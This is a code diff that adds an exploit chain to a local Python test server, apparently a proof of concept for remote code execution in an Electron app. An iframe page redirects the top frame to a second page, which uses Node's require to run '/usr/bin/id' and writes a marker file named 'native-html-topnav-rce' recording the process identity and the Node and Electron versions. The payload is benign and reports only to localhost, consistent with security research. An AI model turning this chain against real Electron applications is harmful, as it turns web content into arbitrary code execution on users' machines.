@@ -69,6 +69,25 @@ document.addEventListener('copy', ev => {
 drag.tabIndex = 0;
 drag.focus();
 </script>'''.replace('__DIRECT_B64__', DIRECT_B64)
+SOURCE_TOPNAV = SOURCE.replace('data:text/html;base64,' + DIRECT_B64,
+    'http://127.0.0.1:18765/stage-a')
+STAGE_A = r'''<!doctype html><meta charset="utf-8"><title>STAGE_A</title>
+<body>Stage A iframe</body><script>
+fetch('http://127.0.0.1:18765/log?event=stage-a-loaded',{mode:'no-cors'});
+setTimeout(() => { top.location.href='http://localhost:18765/stage-b'; }, 300);
+</script>'''
+STAGE_B = r'''<!doctype html><meta charset="utf-8"><title>STAGE_B_LOADING</title>
+<body>Stage B main frame</body><script>
+try {
+  const marker=process.env.NATIVE_DRAG_MARKER || '/tmp/native-html-topnav-rce';
+  const id=require('child_process').execFileSync('/usr/bin/id',{encoding:'utf8'}).trim();
+  require('fs').writeFileSync(marker,
+    'TOPNAV_NODE_ACE=1\nID=' + id + '\nNODE=' + process.versions.node +
+    '\nELECTRON=' + process.versions.electron + '\nURL=' + location.href + '\n');
+  document.title='TOPNAV_NODE_ACE';
+} catch (e) { document.title='TOPNAV_ERROR:' + String(e); }
+fetch('http://127.0.0.1:18765/log?event=stage-b-loaded&require='+encodeURIComponent(typeof require),{mode:'no-cors'});
+</script>'''
 
 class Handler(BaseHTTPRequestHandler):
     def do_GET(self):
@@ -77,6 +96,12 @@ class Handler(BaseHTTPRequestHandler):
         append({"path": p.path, "host": self.headers.get("Host"), "query": q})
         if p.path in ("/", "/source"):
             body = SOURCE.encode()
+        elif p.path == "/source-topnav":
+            body = SOURCE_TOPNAV.encode()
+        elif p.path == "/stage-a":
+            body = STAGE_A.encode()
+        elif p.path == "/stage-b":
+            body = STAGE_B.encode()
         elif p.path == "/log":
             body = b"ok"
         else:
